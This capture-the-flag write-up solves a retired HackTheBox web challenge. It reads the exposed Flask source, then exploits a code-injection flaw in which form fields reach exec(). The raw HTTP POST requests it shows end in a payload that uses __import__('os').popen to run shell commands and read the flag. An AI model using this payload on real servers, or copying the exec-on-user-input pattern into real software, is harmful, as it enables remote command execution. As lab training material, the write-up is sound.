# Solution for Baby Interdimensional - HackTheBox - Challenges - Retired - Web

First, we see there is nothing on the page but in the source there is an interesting comment
```text
<!-- /debug -->
```

Upon visiting, we see the source code of this page and here we have to look through stuff to see what's what

```text
from flask import Flask, Response, request, render_template, request
from random import choice, randint
from string import lowercase
from functools import wraps

app = Flask(__name__)

def calc(recipe):
	global garage
	garage = {}
	try: exec(recipe, garage)
	except: pass

def GCR(func): # Great Calculator of the observable universe and it's infinite timelines
	@wraps(func)
	def federation(*args, **kwargs):
		ingredient = ''.join(choice(lowercase) for _ in range(10))
		recipe = '%s = %s' % (ingredient, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)])))

		if request.method == 'POST':
			ingredient = request.form.get('ingredient', '')
			recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))

		calc(recipe)

		if garage.get(ingredient, ''):
			return render_template('index.html', calculations=garage[ingredient])

		return func(*args, **kwargs)
	return federation

@app.route('/', methods=['GET', 'POST'])
@GCR
def index():
	return render_template('index.html')

@app.route('/debug')
def debug():
	return Response(open(__file__).read(), mimetype='text/plain')

if __name__ == '__main__':
	app.run('0.0.0.0', port=1337)
```

So from what we can see it needs 2 post parameters and then we can have some sort of command injection that is allowing us to run the exec command.
So recipe seems to be a global variable set by measurements. So we try to emulate a POST request and try to control the variable 
```text
POST / HTTP/1.1
Host: 104.248.168.109:32312
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

ingredient=cat&measurements=691
```

Here we have added the content-type to make the request work.

And the page is now printing 691 on the webpage!
Let's try and get the exec command to work

From this website 
https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html

We learn we can do remote command injection in the exec command by doing this 

```
eval("__import__('os').popen('').read()")
```

Now we can try doing ls,
First, this is our POC for command execution is 

![LS POC RCE](https://github.com/HanozDar/challenges/blob/master/baby_interdimensional/images/ls-command-rce.png)

Now let's try to figure out how to cat flag

We are successful! Our final payload is 
```text
POST / HTTP/1.1
Host: 104.248.168.109:32312
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 79

ingredient=cat&measurements=eval("__import__('os').popen('cat flag').read()")
```






